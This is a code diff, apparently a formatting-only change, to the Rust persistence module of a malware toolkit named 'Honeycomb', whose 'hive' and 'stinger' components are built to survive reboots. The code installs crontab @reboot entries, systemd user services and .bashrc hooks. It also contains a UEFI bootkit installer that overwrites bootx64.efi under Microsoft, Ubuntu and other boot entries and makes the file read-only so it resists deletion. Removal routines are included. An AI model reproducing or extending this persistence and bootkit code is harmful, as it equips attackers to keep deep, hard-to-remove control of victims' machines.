@@ -1,16 +1,22 @@
 // Honeycomb: persistence module. Ensures the hive survives reboots.
 // Linux: systemd user service or crontab @reboot entry.
-use std::path::PathBuf;
 use std::path::Path;
+use std::path::PathBuf;
 use tracing::{info, warn};
 /// Install persistence so the hive restarts after reboot.
 /// Returns true if any persistence mechanism was successfully installed.
 pub fn install_persistence() -> bool {
     let mut installed = false;
 
-    if install_crontab() { installed = true; }
-    if install_systemd_user() { installed = true; }
-    if install_bashrc() { installed = true; }
+    if install_crontab() {
+        installed = true;
+    }
+    if install_systemd_user() {
+        installed = true;
+    }
+    if install_bashrc() {
+        installed = true;
+    }
 
     installed
 }
@@ -23,16 +29,18 @@ fn install_crontab() -> bool {
     };
 
     let stinger_path = exe.with_file_name("stinger");
-    if !stinger_path.exists() { return false; }
+    if !stinger_path.exists() {
+        return false;
+    }
 
     let cron_entry = format!(
         "@reboot sleep 30 && {}/stinger &\n",
-        exe.parent().map(|p| p.display().to_string()).unwrap_or_else(|| "/dev/shm".into())
+        exe.parent()
+            .map(|p| p.display().to_string())
+            .unwrap_or_else(|| "/dev/shm".into())
     );
 
-    let result = std::process::Command::new("crontab")
-        .arg("-l")
-        .output();
+    let result = std::process::Command::new("crontab").arg("-l").output();
 
     let current = match result {
         Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
@@ -154,22 +162,20 @@ fn install_bashrc() -> bool {
 /// Uninstall all persistence mechanisms.
 pub fn uninstall_persistence() {
     // Remove crontab entry
-    let _ = std::process::Command::new("crontab")
-        .arg("-r").output();
+    let _ = std::process::Command::new("crontab").arg("-r").output();
 
     // Remove systemd service
     let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
     let _ = std::process::Command::new("systemctl")
         .args(["--user", "disable", "hive.service"])
         .output();
-    let _ = std::fs::remove_file(
-        PathBuf::from(&home).join(".config/systemd/user/hive.service")
-    );
+    let _ = std::fs::remove_file(PathBuf::from(&home).join(".config/systemd/user/hive.service"));
 
     // Remove bashrc marker
     let bashrc = PathBuf::from(&home).join(".bashrc");
     if let Ok(content) = std::fs::read_to_string(&bashrc) {
-        let cleaned: String = content.lines()
+        let cleaned: String = content
+            .lines()
             .filter(|l| !l.contains("HIVE_PERSISTENCE_MARKER") && !l.contains("nohup"))
             .collect::<Vec<_>>()
             .join("\n");
@@ -195,18 +201,23 @@ pub fn install_uefi_bootkit(payload_binary: &[u8]) -> Result<String, String> {
     }
 
     // Find the EFI partition
-    let efi_dirs = [
-        "/boot/efi/EFI",
-        "/boot/EFI",
-        "/efi/EFI",
-    ];
+    let efi_dirs = ["/boot/efi/EFI", "/boot/EFI", "/efi/EFI"];
 
-    let efi_path = efi_dirs.iter()
+    let efi_path = efi_dirs
+        .iter()
         .find(|d| Path::new(d).exists())
         .ok_or_else(|| "EFI partition not found".to_string())?;
 
     // Find existing boot entry to hijack
-    let boot_entries = ["Boot", "boot", "BOOT", "Microsoft", "ubuntu", "debian", "fedora"];
+    let boot_entries = [
+        "Boot",
+        "boot",
+        "BOOT",
+        "Microsoft",
+        "ubuntu",
+        "debian",
+        "fedora",
+    ];
     let mut target_dir = None;
 
     for entry in &boot_entries {
@@ -224,24 +235,25 @@ pub fn install_uefi_bootkit(payload_binary: &[u8]) -> Result<String, String> {
     let backup = target.join("bootx64.efi.hive_bak");
 
     if original.exists() && !backup.exists() {
-        std::fs::copy(&original, &backup)
-            .map_err(|e| format!("backup bootloader: {}", e))?;
+        std::fs::copy(&original, &backup).map_err(|e| format!("backup bootloader: {}", e))?;
         info!("HONEYCOMB: bootkit backed up original bootloader");
     }
 
     // Write the bootkit payload (minimal UEFI application)
     let bootkit_path = target.join("bootx64.efi");
-    std::fs::write(&bootkit_path, payload_binary)
-        .map_err(|e| format!("write bootkit: {}", e))?;
+    std::fs::write(&bootkit_path, payload_binary).map_err(|e| format!("write bootkit: {}", e))?;
 
     // Set immutable attribute to resist deletion
-    let path_cstr = std::ffi::CString::new(bootkit_path.to_string_lossy().as_bytes())
-        .unwrap_or_default();
+    let path_cstr =
+        std::ffi::CString::new(bootkit_path.to_string_lossy().as_bytes()).unwrap_or_default();
     unsafe {
         libc::chmod(path_cstr.as_ptr(), 0o444);
     }
 
-    info!("HONEYCOMB: UEFI bootkit installed at {}", bootkit_path.display());
+    info!(
+        "HONEYCOMB: UEFI bootkit installed at {}",
+        bootkit_path.display()
+    );
     Ok(bootkit_path.display().to_string())
 }
 
@@ -250,22 +262,25 @@ pub fn remove_uefi_bootkit() -> bool {
     let efi_dirs = ["/boot/efi/EFI", "/boot/EFI", "/efi/EFI"];
 
     for efi_path in &efi_dirs {
-        if !Path::new(efi_path).exists() { continue; }
+        if !Path::new(efi_path).exists() {
+            continue;
+        }
 
         let boot_entries = ["Boot", "boot", "BOOT", "Microsoft", "ubuntu"];
         for entry in &boot_entries {
             let target = Path::new(efi_path).join(entry);
-            if !target.exists() { continue; }
+            if !target.exists() {
+                continue;
+            }
 
             let backup = target.join("bootx64.efi.hive_bak");
             let original = target.join("bootx64.efi");
 
-            if backup.exists()
-                && std::fs::copy(&backup, &original).is_ok() {
-                    let _ = std::fs::remove_file(&backup);
-                    info!("HONEYCOMB: UEFI bootkit removed, original restored");
-                    return true;
-                }
+            if backup.exists() && std::fs::copy(&backup, &original).is_ok() {
+                let _ = std::fs::remove_file(&backup);
+                info!("HONEYCOMB: UEFI bootkit removed, original restored");
+                return true;
+            }
         }
     }
     warn!("HONEYCOMB: no bootkit found to remove");
@@ -289,7 +304,9 @@ pub fn generate_bootkit_stub() -> Vec<u8> {
 pub fn bootkit_installed() -> bool {
     let efi_dirs = ["/boot/efi/EFI", "/boot/EFI"];
     for efi_path in &efi_dirs {
-        if !Path::new(efi_path).exists() { continue; }
+        if !Path::new(efi_path).exists() {
+            continue;
+        }
         for entry in &["Boot", "boot", "BOOT", "Microsoft", "ubuntu"] {
             let target = Path::new(efi_path).join(entry);
             let backup = target.join("bootx64.efi.hive_bak");
